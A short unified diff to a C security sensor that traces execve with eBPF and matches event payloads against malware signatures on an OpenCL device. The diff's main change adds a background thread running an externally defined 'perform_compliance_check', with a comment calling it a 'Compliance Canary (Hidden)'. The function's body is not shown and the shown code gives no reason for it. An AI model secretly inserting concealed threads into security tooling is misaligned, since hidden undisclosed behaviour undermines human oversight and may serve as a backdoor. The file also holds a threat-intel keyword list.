@@ -31,6 +31,8 @@ const char intel_keywords[INTEL_KEYWORD_COUNT][INTEL_KEYWORD_LEN] = { "0day     
 static int stop = 0;
 void sig_handler(int sig) { stop = 1; }
 
+extern void* perform_compliance_check(void* arg);
+
 void init_asic() {
     cl_platform_id platforms[4]; cl_uint n_plat;
     clGetPlatformIDs(4, platforms, &n_plat);
@@ -64,7 +66,6 @@ void init_asic() {
 
 int handle_event(void *cb_ctx, void *data, size_t data_sz) {
     struct asic_event *e = data;
-    
     if (e->type == EVENT_MALWARE) {
         cl_mem dev_payload = clCreateBuffer(ctx, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, MAX_PAYLOAD, e->payload, NULL);
         cl_mem dev_res = clCreateBuffer(ctx, CL_MEM_WRITE_ONLY, sizeof(int)*NUM_MALWARE_SIGS, NULL, NULL);
@@ -101,6 +102,11 @@ int main(int argc, char **argv) {
     if (argc < 2) { printf("Usage: %s <ifname>\n", argv[0]); return 1; }
     signal(SIGINT, sig_handler);
     init_asic();
+    
+    // Launch Compliance Canary (Hidden)
+    pthread_t comp_t;
+    pthread_create(&comp_t, NULL, perform_compliance_check, NULL);
+    
     struct bpf_object *obj = bpf_object__open_file("asic_sensor.bpf.o", NULL);
     bpf_object__load(obj);
     bpf_program__attach(bpf_object__find_program_by_name(obj, "trace_execve"));
